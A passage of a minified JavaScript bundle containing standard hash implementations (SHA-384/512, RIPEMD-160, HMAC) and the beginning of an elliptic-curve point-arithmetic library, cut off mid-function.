bee=Ua;Ua.blockSize=512,Ua.outSize=224,Ua.hmacStrength=192,Ua.padLength=64,Ua.prototype._digest=function(e){return"hex"===e?$2.toHex32(this.h.slice(0,7),"big"):$2.split32(this.h.slice(0,7),"big")};var Hi=Yt,wee=fh,yee=j0,Jo=Hi.rotr64_hi,Zo=Hi.rotr64_lo,A7=Hi.shr64_hi,I7=Hi.shr64_lo,uc=Hi.sum64,Jw=Hi.sum64_hi,Zw=Hi.sum64_lo,_ee=Hi.sum64_4_hi,Eee=Hi.sum64_4_lo,xee=Hi.sum64_5_hi,See=Hi.sum64_5_lo,R7=wee.BlockHash,Cee=[1116352408,3609767458,1899447441,602891725,3049323471,3964484399,3921009573,2173295548,961987163,4081628472,1508970993,3053834265,2453635748,2937671579,2870763221,3664609560,3624381080,2734883394,310598401,1164996542,607225278,1323610764,1426881987,3590304994,1925078388,4068182383,2162078206,991336113,2614888103,633803317,3248222580,3479774868,3835390401,2666613458,4022224774,944711139,264347078,2341262773,604807628,2007800933,770255983,1495990901,1249150122,1856431235,1555081692,3175218132,1996064986,2198950837,2554220882,3999719339,2821834349,766784016,2952996808,2566594879,3210313671,3203337956,3336571891,1034457026,3584528711,2466948901,113926993,3758326383,338241895,168717936,666307205,1188179964,773529912,1546045734,1294757372,1522805485,1396182291,2643833823,1695183700,2343527390,1986661051,1014477480,2177026350,1206759142,2456956037,344077627,2730485921,1290863460,2820302411,3158454273,3259730800,3505952657,3345764771,106217008,3516065817,3606008344,3600352804,1432725776,4094571909,1467031594,275423344,851169720,430227734,3100823752,506948616,1363258195,659060556,3750685593,883997877,3785050280,958139571,3318307427,1322822218,3812723403,1537002063,2003034995,1747873779,3602036899,1955562222,1575990012,2024104815,1125592928,2227730452,2716904306,2361852424,442776044,2428436474,593698344,2756734187,3733110249,3204031479,2999351573,3329325298,3815920427,3391569614,3928383900,3515267271,566280711,3940187606,3454069534,4118630271,4000239992,116418474,1914138554,174292421,2731055270,289380356,3203993006,460393269,320620315,685471733,587496836,852142971,1086792851,1017036298,365543100,1126000580,2618297676,1288033470,3409855158,1501505948,4234509866,1607167915,987167468,1816402316,1246189591];function wo(){if(!(this instanceof wo))return new wo;R7.call(this),this.h=[1779033703,4089235720,3144134277,2227873595,1013904242,4271175723,2773480762,1595750129,1359893119,2917565137,2600822924,725511199,528734635,4215389547,1541459225,327033209],this.k=Cee,this.W=new Array(160)}Hi.inherits(wo,R7);var T7=wo;function Aee(e,t,r,n,i){var o=e&r^~e&i;return o<0&&(o+=4294967296),o}function Iee(e,t,r,n,i,o){var s=t&n^~t&o;return s<0&&(s+=4294967296),s}function Ree(e,t,r,n,i){var o=e&r^e&i^r&i;return o<0&&(o+=4294967296),o}function Tee(e,t,r,n,i,o){var s=t&n^t&o^n&o;return s<0&&(s+=4294967296),s}function Nee(e,t){var r=Jo(e,t,28)^Jo(t,e,2)^Jo(t,e,7);return r<0&&(r+=4294967296),r}function Oee(e,t){var r=Zo(e,t,28)^Zo(t,e,2)^Zo(t,e,7);return r<0&&(r+=4294967296),r}function Pee(e,t){var r=Jo(e,t,14)^Jo(e,t,18)^Jo(t,e,9);return r<0&&(r+=4294967296),r}function Mee(e,t){var r=Zo(e,t,14)^Zo(e,t,18)^Zo(t,e,9);return r<0&&(r+=4294967296),r}function kee(e,t){var r=Jo(e,t,1)^Jo(e,t,8)^A7(e,t,7);return r<0&&(r+=4294967296),r}function Dee(e,t){var r=Zo(e,t,1)^Zo(e,t,8)^I7(e,t,7);return r<0&&(r+=4294967296),r}function $ee(e,t){var r=Jo(e,t,19)^Jo(t,e,29)^A7(e,t,6);return r<0&&(r+=4294967296),r}function Lee(e,t){var r=Zo(e,t,19)^Zo(t,e,29)^I7(e,t,6);return r<0&&(r+=4294967296),r}wo.blockSize=1024,wo.outSize=512,wo.hmacStrength=192,wo.padLength=128,wo.prototype._prepareBlock=function(e,t){for(var r=this.W,n=0;n<32;n++)r[n]=e[t+n];for(;n<r.length;n+=2){var i=$ee(r[n-4],r[n-3]),o=Lee(r[n-4],r[n-3]),s=r[n-14],a=r[n-13],c=kee(r[n-30],r[n-29]),l=Dee(r[n-30],r[n-29]),u=r[n-32],h=r[n-31];r[n]=_ee(i,o,s,a,c,l,u,h),r[n+1]=Eee(i,o,s,a,c,l,u,h)}},wo.prototype._update=function(e,t){this._prepareBlock(e,t);var r=this.W,n=this.h[0],i=this.h[1],o=this.h[2],s=this.h[3],a=this.h[4],c=this.h[5],l=this.h[6],u=this.h[7],h=this.h[8],d=this.h[9],f=this.h[10],p=this.h[11],g=this.h[12],m=this.h[13],v=this.h[14],y=this.h[15];yee(this.k.length===r.length);for(var b=0;b<r.length;b+=2){var w=v,_=y,E=Pee(h,d),x=Mee(h,d),S=Aee(h,d,f,p,g),A=Iee(h,d,f,p,g,m),C=this.k[b],I=this.k[b+1],k=r[b],N=r[b+1],R=xee(w,_,E,x,S,A,C,I,k,N),T=See(w,_,E,x,S,A,C,I,k,N);w=Nee(n,i),_=Oee(n,i),E=Ree(n,i,o,s,a),x=Tee(n,i,o,s,a,c);var O=Jw(w,_,E,x),P=Zw(w,_,E,x);v=g,y=m,g=f,m=p,f=h,p=d,h=Jw(l,u,R,T),d=Zw(u,u,R,T),l=a,u=c,a=o,c=s,o=n,s=i,n=Jw(R,T,O,P),i=Zw(R,T,O,P)}uc(this.h,0,n,i),uc(this.h,2,o,s),uc(this.h,4,a,c),uc(this.h,6,l,u),uc(this.h,8,h,d),uc(this.h,10,f,p),uc(this.h,12,g,m),uc(this.h,14,v,y)},wo.prototype._digest=function(e){return"hex"===e?Hi.toHex32(this.h,"big"):Hi.split32(this.h,"big")};var L2=Yt,N7=T7;function Wa(){if(!(this instanceof Wa))return new Wa;N7.call(this),this.h=[3418070365,3238371032,1654270250,914150663,2438529370,812702999,355462360,4144912697,1731405415,4290775857,2394180231,1750603025,3675008525,1694076839,1203062813,3204075428]}L2.inherits(Wa,N7);var Bee=Wa;Wa.blockSize=1024,Wa.outSize=384,Wa.hmacStrength=192,Wa.padLength=128,Wa.prototype._digest=function(e){return"hex"===e?L2.toHex32(this.h.slice(0,12),"big"):L2.split32(this.h.slice(0,12),"big")},hh.sha1=oee,hh.sha224=bee,hh.sha256=S7,hh.sha384=Bee,hh.sha512=T7;var O7={},Kl=Yt,Fee=fh,C1=Kl.rotl32,x8=Kl.sum32,ad=Kl.sum32_3,S8=Kl.sum32_4,P7=Fee.BlockHash;function ia(){if(!(this instanceof ia))return new ia;P7.call(this),this.h=[1732584193,4023233417,2562383102,271733878,3285377520],this.endian="little"}function C8(e,t,r,n){return e<=15?t^r^n:e<=31?t&r|~t&n:e<=47?(t|~r)^n:e<=63?t&n|r&~n:t^(r|~n)}function jee(e){return e<=15?0:e<=31?1518500249:e<=47?1859775393:e<=63?2400959708:2840853838}function Uee(e){return e<=15?1352829926:e<=31?1548603684:e<=47?1836072691:e<=63?2053994217:0}Kl.inherits(ia,P7),O7.ripemd160=ia,ia.blockSize=512,ia.outSize=160,ia.hmacStrength=192,ia.padLength=64,ia.prototype._update=function(e,t){for(var r=this.h[0],n=this.h[1],i=this.h[2],o=this.h[3],s=this.h[4],a=r,c=n,l=i,u=o,h=s,d=0;d<80;d++){var f=x8(C1(S8(r,C8(d,n,i,o),e[Wee[d]+t],jee(d)),Hee[d]),s);r=s,s=o,o=C1(i,10),i=n,n=f,f=x8(C1(S8(a,C8(79-d,c,l,u),e[zee[d]+t],Uee(d)),qee[d]),h),a=h,h=u,u=C1(l,10),l=c,c=f}f=ad(this.h[1],i,u),this.h[1]=ad(this.h[2],o,h),this.h[2]=ad(this.h[3],s,a),this.h[3]=ad(this.h[4],r,c),this.h[4]=ad(this.h[0],n,l),this.h[0]=f},ia.prototype._digest=function(e){return"hex"===e?Kl.toHex32(this.h,"little"):Kl.split32(this.h,"little")};var Wee=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8,3,10,14,4,9,15,8,1,2,7,0,6,13,11,5,12,1,9,11,10,0,8,12,4,13,3,7,15,14,5,6,2,4,0,5,9,7,12,2,10,14,1,3,8,11,6,15,13],zee=[5,14,7,0,9,2,11,4,13,6,15,8,1,10,3,12,6,11,3,7,0,13,5,10,14,15,8,12,4,9,1,2,15,5,1,3,7,14,6,9,11,8,12,2,10,0,4,13,8,6,4,1,3,11,15,0,5,12,2,13,9,7,10,14,12,15,10,4,1,5,8,7,6,2,13,14,0,3,9,11],Hee=[11,14,15,12,5,8,7,9,11,13,14,15,6,7,9,8,7,6,8,13,11,9,7,15,7,12,15,9,11,7,13,12,11,13,6,7,14,9,13,15,14,8,13,6,5,12,7,5,11,12,14,15,14,15,9,8,9,14,5,6,8,6,5,12,9,15,5,11,6,8,13,12,5,12,13,14,11,8,5,6],qee=[8,9,9,11,13,15,15,5,7,7,8,11,14,14,12,6,9,13,15,7,12,8,9,11,7,7,12,7,6,15,13,11,9,7,15,11,8,6,6,14,12,13,5,14,13,13,7,5,15,5,8,11,14,14,6,14,6,9,12,9,12,5,15,8,8,5,12,9,12,5,14,6,8,13,6,5,15,13,11,11],Vee=Yt,Gee=j0;function Bf(e,t,r){if(!(this instanceof Bf))return new Bf(e,t,r);this.Hash=e,this.blockSize=e.blockSize/8,this.outSize=e.outSize/8,this.inner=null,this.outer=null,this._init(Vee.toArray(t,r))}var Kee=Bf;Bf.prototype._init=function(e){e.length>this.blockSize&&(e=(new this.Hash).update(e).digest()),Gee(e.length<=this.blockSize);for(var t=e.length;t<this.blockSize;t++)e.push(0);for(t=0;t<e.length;t++)e[t]^=54;for(this.inner=(new this.Hash).update(e),t=0;t<e.length;t++)e[t]^=106;this.outer=(new this.Hash).update(e)},Bf.prototype.update=function(e,t){return this.inner.update(e,t),this},Bf.prototype.digest=function(e){return this.outer.update(this.inner.digest()),this.outer.digest(e)},function(e){var t=p7;t.utils=Yt,t.common=fh,t.sha=hh,t.ripemd=O7,t.hmac=Kee,t.sha1=t.sha.sha1,t.sha256=t.sha.sha256,t.sha224=t.sha.sha224,t.sha384=t.sha.sha384,t.sha512=t.sha.sha512,t.ripemd160=t.ripemd.ripemd160}();const $o=tu(p7);function ph(e,t,r){return r={path:t,exports:{},require:function(e,t){return Jee(e,t??r.path)}},e(r,r.exports),r.exports}function Jee(){throw new Error("Dynamic requires are not currently supported by @rollup/plugin-commonjs")}var v_=M7;function M7(e,t){if(!e)throw new Error(t||"Assertion failed")}M7.equal=function(e,t,r){if(e!=t)throw new Error(r||"Assertion failed: "+e+" != "+t)};var go=ph((function(e,t){var r=t;function n(e){return 1===e.length?"0"+e:e}function i(e){for(var t="",r=0;r<e.length;r++)t+=n(e[r].toString(16));return t}r.toArray=function(e,t){if(Array.isArray(e))return e.slice();if(!e)return[];var r=[];if("string"!=typeof e){for(var n=0;n<e.length;n++)r[n]=0|e[n];return r}if("hex"===t){(e=e.replace(/[^a-z0-9]+/gi,"")).length%2!=0&&(e="0"+e);for(n=0;n<e.length;n+=2)r.push(parseInt(e[n]+e[n+1],16))}else for(n=0;n<e.length;n++){var i=e.charCodeAt(n),o=i>>8,s=255&i;o?r.push(o,s):r.push(s)}return r},r.zero2=n,r.toHex=i,r.encode=function(e,t){return"hex"===t?i(e):e}})),hs=ph((function(e,t){var r=t;r.assert=v_,r.toArray=go.toArray,r.zero2=go.zero2,r.toHex=go.toHex,r.encode=go.encode,r.getNAF=function(e,t,r){var n=new Array(Math.max(e.bitLength(),r)+1);n.fill(0);for(var i=1<<t+1,o=e.clone(),s=0;s<n.length;s++){var a,c=o.andln(i-1);o.isOdd()?(a=c>(i>>1)-1?(i>>1)-c:c,o.isubn(a)):a=0,n[s]=a,o.iushrn(1)}return n},r.getJSF=function(e,t){var r=[[],[]];e=e.clone(),t=t.clone();for(var n,i=0,o=0;e.cmpn(-i)>0||t.cmpn(-o)>0;){var s,a,c=e.andln(3)+i&3,l=t.andln(3)+o&3;3===c&&(c=-1),3===l&&(l=-1),1&c?s=3!==(n=e.andln(7)+i&7)&&5!==n||2!==l?c:-c:s=0,r[0].push(s),1&l?a=3!==(n=t.andln(7)+o&7)&&5!==n||2!==c?l:-l:a=0,r[1].push(a),2*i===s+1&&(i=1-i),2*o===a+1&&(o=1-o),e.iushrn(1),t.iushrn(1)}return r},r.cachedProperty=function(e,t,r){var n="_"+t;e.prototype[t]=function(){return void 0!==this[n]?this[n]:this[n]=r.call(this)}},r.parseBytes=function(e){return"string"==typeof e?r.toArray(e,"hex"):e},r.intFromLE=function(e){return new Ot(e,"hex","le")}})),Hg=hs.getNAF,Zee=hs.getJSF,qg=hs.assert;function Jc(e,t){this.type=e,this.p=new Ot(t.p,16),this.red=t.prime?Ot.red(t.prime):Ot.mont(this.p),this.zero=new Ot(0).toRed(this.red),this.one=new Ot(1).toRed(this.red),this.two=new Ot(2).toRed(this.red),this.n=t.n&&new Ot(t.n,16),this.g=t.g&&this.pointFromJSON(t.g,t.gRed),this._wnafT1=new Array(4),this._wnafT2=new Array(4),this._wnafT3=new Array(4),this._wnafT4=new Array(4),this._bitLength=this.n?this.n.bitLength():0;var r=this.n&&this.p.div(this.n);!r||r.cmpn(100)>0?this.redN=null:(this._maxwellTrick=!0,this.redN=this.n.toRed(this.red))}var fu=Jc;function Ws(e,t){this.curve=e,this.type=t,this.precomputed=null}Jc.prototype.point=function(){throw new Error("Not implemented")},Jc.prototype.validate=function(){throw new Error("Not implemented")},Jc.prototype._fixedNafMul=function(e,t){qg(e.precomputed);var r=e._getDoubles(),n=Hg(t,1,this._bitLength),i=(1<<r.step+1)-(r.step%2==0?2:1);i/=3;var o,s,a=[];for(o=0;o<n.length;o+=r.step){s=0;for(var c=o+r.step-1;c>=o;c--)s=(s<<1)+n[c];a.push(s)}for(var l=this.jpoint(null,null,null),u=this.jpoint(null,null,null),h=i;h>0;h--){for(o=0;o<a.length;o++)(s=a[o])===h?u=u.mixedAdd(r.points[o]):s===-h&&(u=u.mixedAdd(r.points[o].neg()));l=l.add(u)}return l.toP()},Jc.prototype._wnafMul=function(e,t){var r=4,n=e._getNAFPoints(r);r=n.wnd;for(var i=n.points,o=Hg(t,r,this._bitLength),s=this.jpoint(null,null,null),a=o.length-1;a>=0;a--){for(var c=0;a>=0&&0===o[a];a--)c++;if(a>=0&&c++,s=s.dblp(c),a<0)break;var l=o[a];qg(0!==l),s="affine"===e.type?l>0?s.mixedAdd(i[l-1>>1]):s.mixedAdd(i[-l-1>>1].neg()):l>0?s.add(i[l-1>>1]):s.add(i[-l-1>>1].neg())}return"affine"===e.type?s.toP():s},Jc.prototype._wnafMulAdd=function(e,t,r,n,i){var o,s,a,c=this._wnafT1,l=this._wnafT2,u=this._wnafT3,h=0;for(o=0;o<n;o++){var d=(a=t[o])._getNAFPoints(e);c[o]=d.wnd,l[o]=d.points}for(o=n-1;o>=1;o-=2){var f=o-1,p=o;if(1===c[f]&&1===c[p]){var g=[t[f],null,null,t[p]];0===t[f].y.cmp(t[p].y)?(g[1]=t[f].add(t[p]),g[2]=t[f].toJ().mixedAdd(t[p].neg())):0===t[f].y.cmp(t[p].y.redNeg())?(g[1]=t[f].toJ().mixedAdd(t[p]),g[2]=t[f].add(t[p].neg())):(g[1]=t[f].toJ().mixedAdd(t[p]),g[2]=t[f].toJ().mixedAdd(t[p].neg()));var m=[-3,-1,-5,-7,0,7,5,1,3],v=Zee(r[f],r[p]);for(h=Math.max(v[0].length,h),u[f]=new Array(h),u[p]=new Array(h),s=0;s<h;s++){var y=0|v[0][s],b=0|v[1][s];u[f][s]=m[3*(y+1)+(b+1)],u[p][s]=0,l[f]=g}}else u[f]=Hg(r[f],c[f],this._bitLength),u[p]=Hg(r[p],c[p],this._bitLength),h=Math.max(u[f].length,h),h=Math.max(u[p].length,h)}var w=this.jpoint(null,null,null),_=this._wnafT4;for(o=h;o>=0;o--){for(var E=0;o>=0;){var x=!0;for(s=0;s<n;s++)_[s]=0|u[s][o],0!==_[s]&&(x=!1);if(!x)break;E++,o--}if(o>=0&&E++,w=w.dblp(E),o<0)break;for(s=0;s<n;s++){var S=_[s];0!==S&&(S>0?a=l[s][S-1>>1]:S<0&&(a=l[s][-S-1>>1].neg()),w="affine"===a.type?w.mixedAdd(a):w.add(a))}}for(o=0;o<n;o++)l[o]=null;return i?w:w.toP()},Jc.BasePoint=Ws,Ws.prototype.eq=function(){throw new Error("Not implemented")},Ws.prototype.validate=function(){return this.curve.validate(this)},Jc.prototype.decodePoint=function(e,t){e=hs.toArray(e,t);var r=this.p.byteLength();if((4===e[0]||6===e[0]||7===e[0])&&e.length-1==2*r)return 6===e[0]?qg(e[e.length-1]%2==0):7===e[0]&&qg(e[e.length-1]%2==1),this.point(e.slice(1,1+r),e.slice(1+r,1+2*r));if((2===e[0]||3===e[0])&&e.length-1===r)return this.pointFromX(e.slice(1,1+r),3===e[0]);throw new Error("Unknown point format")},Ws.prototype.encodeCompressed=function(e){return this.encode(e,!0)},Ws.prototype._encode=function(e){var t=this.curve.p.byteLength(),r=this.getX().toArray("be",t);return e?[this.getY().isEven()?2:3].concat(r):[4].concat(r,this.getY().toArray("be",t))},Ws.prototype.encode=function(e,t){return hs.encode(this._encode(t),e)},Ws.prototype.precompute=function(e){if(this.precomputed)return this;var t={doubles:null,naf:null,beta:null};return t.naf=this._getNAFPoints(8),t.doubles=this._getDoubles(4,e),t.beta=this._getBeta(),this.precomputed=t,this},Ws.prototype._hasDoubles=function(e){if(!this.precomputed)return!1;var t=this.precomputed.doubles;return!!t&&t.points.length>=Math.ceil((e.bitLength()+1)/t.step)},Ws.prototype._getDoubles=function(e,t){if(this.precomputed&&this.precomputed.doubles)return this.precomputed.doubles;for(var r=[this],n=this,i=0;i<t;i+=e){for(var o=0;o<e;o++)n=n.dbl();r.push(n)}return{step:e,points:r}},Ws.prototype._getNAFPoints=function(e){if(this.precomputed&&this.precomputed.naf)return this.precomputed.naf;for(var t=[this],r=(1<<e)-1,n=1===r?null:this.dbl(),i=1;i<r;i++)t[i]=t[i-1].add(n);return{wnd:e,points:t}},Ws.prototype._getBeta=function(){return null},Ws.prototype.dblp=function(e){for(var t=this,r=0;r<e;r++)t=t.dbl();return t};var m_=ph((function(e){"function"==typeof Object.create?e.exports=function(e,t){t&&(e.super_=t,e.prototype=Object.create(t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}))}:e.exports=function(e,t){if(t){e.super_=t;var r=function(){};r.prototype=t.prototype,e.prototype=new r,e.prototype.constructor=e}}})),Qee=hs.assert;function zs(e){fu.call(this,"short",e),this.a=new Ot(e.a,16).toRed(this.red),this.b=new Ot(e.b,16).toRed(this.red),this.tinv=this.two.redInvm(),this.zeroA=0===this.a.fromRed().cmpn(0),this.threeA=0===this.a.fromRed().sub(this.p).cmpn(-3),this.endo=this._getEndomorphism(e),this._endoWnafT1=new Array(4),this._endoWnafT2=new Array(4)}m_(zs,fu);var Yee=zs;function Mn(e,t,r,n){fu.BasePoint.call(this,e,"affine"),null===t&&null===r?(this.x=null,this.y=null,this.inf=!0):(this.x=new Ot(t,16),this.y=new Ot(r,16),n&&(this.x.forceRed(this.curve.red),this.y.forceRed(this.curve.red)),this.x.red||(this.x=this.x.toRed(this.curve.red)),this.y.red||(this.y=this.y.toRed(this.curve.red)),this.inf=!1)}function qn(e,t,r,n){fu.BasePoint.call(this,e,"jacobian"),null===t&&null===r&&null===n?(this.x=this.curve.one,this.y=this.curve.one,this.z=new Ot(0)):(this.x=new Ot(t,16),this.y=new Ot(r,16),this.z=new Ot(n,16)),this.x.red||(this.x=this.x.toRed(this.curve.red)),this.y.red||(this.y=this.y.toRed(this.curve.red)),this.z.red||(this.z=this.z.toRed(this.curve.red)),this.zOne=this.z===this.curve.one}zs.prototype._getEndomorphism=function(e){if(this.zeroA&&this.g&&this.n&&1===this.p.modn(3)){var t,r;if(e.beta)t=new Ot(e.beta,16).toRed(this.red);else{var n=this._getEndoRoots(this.p);t=(t=n[0].cmp(n[1])<0?n[0]:n[1]).toRed(this.red)}if(e.lambda)r=new Ot(e.lambda,16);else{var i=this._getEndoRoots(this.n);0===this.g.mul(i[0]).x.cmp(this.g.x.redMul(t))?r=i[0]:(r=i[1],Qee(0===this.g.mul(r).x.cmp(this.g.x.redMul(t))))}return{beta:t,lambda:r,basis:e.basis?e.basis.map((function(e){return{a:new Ot(e.a,16),b:new Ot(e.b,16)}})):this._getEndoBasis(r)}}},zs.prototype._getEndoRoots=function(e){var t=e===this.p?this.red:Ot.mont(e),r=new Ot(2).toRed(t).redInvm(),n=r.redNeg(),i=new Ot(3).toRed(t).redNeg().redSqrt().redMul(r);return[n.redAdd(i).fromRed(),n.redSub(i).fromRed()]},zs.prototype._getEndoBasis=function(e){for(var t,r,n,i,o,s,a,c,l,u=this.n.ushrn(Math.floor(this.n.bitLength()/2)),h=e,d=this.n.clone(),f=new Ot(1),p=new Ot(0),g=new Ot(0),m=new Ot(1),v=0;0!==h.cmpn(0);){var y=d.div(h);c=d.sub(y.mul(h)),l=g.sub(y.mul(f));var b=m.sub(y.mul(p));if(!n&&c.cmp(u)<0)t=a.neg(),r=f,n=c.neg(),i=l;else if(n&&2==++v)break;a=c,d=h,h=c,g=f,f=l,m=p,p=b}o=c.neg(),s=l;var w=n.sqr().add(i.sqr());return o.sqr().add(s.sqr()).cmp(w)>=0&&(o=t,s=r),n.negative&&(n=n.neg(),i=i.neg()),o.negative&&(o=o.neg(),s=s.neg()),[{a:n,b:i},{a:o,b:s}]},zs.prototype._endoSplit=function(e){var t=this.endo.basis,r=t[0],n=t[1],i=n.b.mul(e).divRound(this.n),o=r.b.neg().mul(e).divRound(this.n),s=i.mul(r.a),a=o.mul(n.a),c=i.mul(r.b),l=o.mul(n.b);return{k1:e.sub(s).sub(a),k2:c.add(l).neg()}},zs.prototype.pointFromX=function(e,t){(e=new Ot(e,16)).red||(e=e.toRed(this.red));var r=e.redSqr().redMul(e).redIAdd(e.redMul(this.a)).redIAdd(this.b),n=r.redSqrt();if(0!==n.redSqr().redSub(r).cmp(this.zero))throw new Error("invalid point");var i=n.fromRed().isOdd();return(t&&!i||!t&&i)&&(n=n.redNeg()),this.point(e,n)},zs.prototype.validate=function(e){if(e.inf)return!0;var t=e.x,r=e.y,n=this.a.redMul(t),i=t.redSqr().redMul(t).redIAdd(n).redIAdd(this.b);return 0===r.redSqr().redISub(i).cmpn(0)},zs.prototype._endoWnafMulAdd=function(e,t,r){for(var n=this._endoWnafT1,i=this._endoWnafT2,o=0;o<e.length;o++){var s=this._endoSplit(t[o]),a=e[o],c=a._getBeta();s.k1.negative&&(s.k1.ineg(),a=a.neg(!0)),s.k2.negative&&(s.k2.ineg(),c=c.neg(!0)),n[2*o]=a,n[2*o+1]=c,i[2*o]=s.k1,i[2*o+1]=s.k2}for(var l=this._wnafMulAdd(1,n,i,2*o,r),u=0;u<2*o;u++)n[u]=null,i[u]=null;return l},m_(Mn,fu.BasePoint),zs.prototype.point=function(e,t,r){return new Mn(this,e,t,r)},zs.prototype.pointFromJSON=function(e,t){return Mn.fromJSON(this,e,t)},Mn.prototype._getBeta=function(){if(this.curve.endo){var e=this.precomputed;if(e&&e.beta)return e.beta;var t=this.curve.point(this.x.redMul(this.curve.endo.beta),this.y);if(e){var r=this.curve,n=function(e){return r.point(e.x.redMul(r.endo.beta),e.y)};e.beta=t,t.precomputed={beta:null,naf:e.naf&&{wnd:e.naf.wnd,points:e.naf.points.map(n)},doubles:e.doubles&&{step:e.doubles.step,points:e.doubles.points.map(n)}}}return t}},Mn.prototype.toJSON=function(){return this.precomputed?[this.x,this.y,this.precomputed&&{doubles:this.precomputed.doubles&&{step:this.precomputed.doubles.step,points:this.precomputed.doubles.points.slice(1)},naf:this.precomputed.naf&&{wnd:this.precomputed.naf.wnd,points:this.precomputed.naf.points.slice(1)}}]:[this.x,this.y]},Mn.fromJSON=function(e,t,r){"string"==typeof t&&(t=JSON.parse(t));var n=e.point(t[0],t[1],r);if(!t[2])return n;function i(t){return e.point(t[0],t[1],r)}var o=t[2];return n.precomputed={beta:null,doubles:o.doubles&&{step:o.doubles.step,points:[n].concat(o.doubles.points.map(i))},naf:o.naf&&{wnd:o.naf.wnd,points:[n].concat(o.naf.points.map(i))}},n},Mn.prototype.inspect=function(){return this.isInfinity()?"<EC Point Infinity>":"<EC Point x: "+this.x.fromRed().toString(16,2)+" y: "+this.y.fromRed().toString(16,2)+">"},Mn.prototype.isInfinity=function(){return this.inf},Mn.prototype.add=function(e){if(this.inf)return e;if(e.inf)return this;if(this.eq(e))return this.dbl();if(this.neg().eq(e))return this.curve.point(null,null);if(0===this.x.cmp(e.x))return this.curve.point(null,null);var t=this.y.redSub(e.y);0!==t.cmpn(0)&&(t=t.redMul(this.x.redSub(e.x).redInvm()));var r=t.redSqr().redISub(this.x).redISub(e.x),n=t.redMul(this.x.redSub(r)).redISub(this.y);return this.curve.point(r,n)},Mn.prototype.dbl=function(){if(this.inf)return this;var e=this.y.redAdd(this.y);if(0===e.cmpn(0))return this.curve.point(null,null);var t=this.curve.a,r=this.x.redSqr(),n=e.redInvm(),i=r.redAdd(r).redIAdd(r).redIAdd(t).redMul(n),o=i.redSqr().redISub(this.x.redAdd(this.x)),s=i.redMul(this.x.redSub(o)).redISub(this.y);return this.curve.point(o,s)},Mn.prototype.getX=function(){return this.x.fromRed()},Mn.prototype.getY=function(){return this.y.fromRed()},Mn.prototype.mul=function(e){return e=new Ot(e,16),this.isInfinity()?this:this._hasDoubles(e)?this.curve._fixedNafMul(this,e):this.curve.endo?this.curve._endoWnafMulAdd([this],[e]):this.curve._wnafMul(this,e)},Mn.prototype.mulAdd=function(e,t,r){var n=[this,t],i=[e,r];return this.curve.endo?this.curve._endoWnafMulAdd(n,i):this.curve._wnafMulAdd(1,n,i,2)},Mn.prototype.jmulAdd=function(e,t,r){var n=[this,t],i=[e,r];return this.curve.endo?this.curve._endoWnafMulAdd(n,i,!0):this.curve._wnafMulAdd(1,n,i,2,!0)},Mn.prototype.eq=function(e){return this===e||this.inf===e.inf&&(this.inf||0===this.x.cmp(e.x)&&0===this.y.cmp(e.y))},Mn.prototype.neg=function(e){if(this.inf)return this;var t=this.curve.point(this.x,this.y.redNeg());if(e&&this.precomputed){var r=this.precomputed,n=function(e){return e.neg()};t.precomputed={naf:r.naf&&{wnd:r.naf.wnd,points:r.naf.points.map(n)},doubles:r.doubles&&{step:r.doubles.step,points:r.doubles.points.map(n)}}}return t},Mn.prototype.toJ=function(){return this.inf?this.curve.jpoint(null,null,null):this.curve.jpoint(this.x,this.y,this.curve.one)},m_(qn,fu.BasePoint),zs.prototype.jpoint=function(e,t,r){return new qn(this,e,t,r)},qn.prototype.toP=function(){if(this.isInfinity())return this.curve.point(null,null);var e=this.z.redInvm(),t=e.redSqr(),r=this.x.redMul(t),n=this.y.redMul(t).redMul(e);return this.curve.point(r,n)},qn.prototype.neg=function(){return this.curve.jpoint(this.x,this.y.redNeg(),this.z)},qn.prototype.add=function(e){if(this.isInfinity())return e;if(e.isInfinity())return this;var t=e.z.redSqr(),r=this.z.redSqr(),n=this.x.redMul(t),i=e.x.redMul(r),o=this.y.redMul(t.redMul(e.z)),s=e.y.redMul(r.redMul(this.z)),a=n.redSub(i),c=o.redSub(s);if(0===a.cmpn(0))return 0!==c.cmpn(0)?this.curve.jpoint(null,null,null):this.dbl();var l=a.redSqr(),u=l.redMul(a),h=n.redMul(l),d=c.redSqr().redIAdd(u).redISub(h).redISub(h),f=c.redMul(h.redISub(d)).redISub(o.redMul(u)),p=this.z.redMul(e.z).redMul(a);return this.curve.jpoint(d,f,p)},qn.prototype.mixedAdd=function(e){if(this.isInfinity())return e.toJ();if(e.isInfinity())return this;var t=this.z.redSqr(),r=this.x,n=e.x.redMul(t),i=this.y,o=e.y.redMul(t).redMul(this.z),s=r.redSub(n),a=i.redSub(o);if(0===s.cmpn(0))return 0!==a.cmpn(0)?this.curve.jpoint(null,null,null):this.dbl();var c=s.redSqr(),l=c.redMul(s),u=r.redMul(c),h=a.redSqr().redIAdd(l).redISub(u).redISub(u),d=a.redMul(u.redISub(h)).redISub(i.redMul(l)),f=this.z.redMul(s);return this.curve.jpoint(h,d,f)},qn.prototype.dblp=function(e){if(0===e)return this;if(this.isInfinity())return this;if(!e)return this.dbl();var t;if(this.curve.zeroA||this.curve.threeA){var r=this;for(t=0;t<e;t++)r=r.dbl();return r}var n=this.curve.a,i=this.curve.tinv,o=this.x,s=this.y,a=this.z,c=a.redSqr().redSqr(),l=s.redAdd(s);for(t=0;t<e;t++){var u=o.redSqr(),h=l.redSqr(),d=h.redSqr(),f=u.redAdd(u).redIAdd(u).redIAdd(n.redMul(c)),p=o.redMul(h),g=f.redSqr().redISub(p.redAdd(p)),m=p.redISub(g),v=f.redMul(m);v=v.redIAdd(v).redISub(d);var y=l.redMul(a);t+1<e&&(c=c.redMul(d)),o=g,a=y,l=v}return this.curve.jpoint(o,l.redMul(i),a)},qn.prototype.dbl=function(){return this.isInfinity()?this:this.curve.zeroA?this._zeroDbl():this.curve.threeA?this._threeDbl():this._dbl()},qn.prototype._zeroDbl=function(){var e,t,r;if(this.zOne){var n=this.x.redSqr(),i=this.y.redSqr(),o=i.redSqr(),s=this.x.redAdd(i).redSqr().redISub(n).redISub(o);s=s.redIAdd(s);var a=n.redAdd(n).redIAdd(n),c=a.redSqr().redISub(s).redISub(s),l=o.redIAdd(o);l=(l=l.redIAdd(l)).redIAdd(l),e=c,t=a.redMul(s.redISub(c)).redISub(l),r=this.y.redAdd(this.y)}else{var 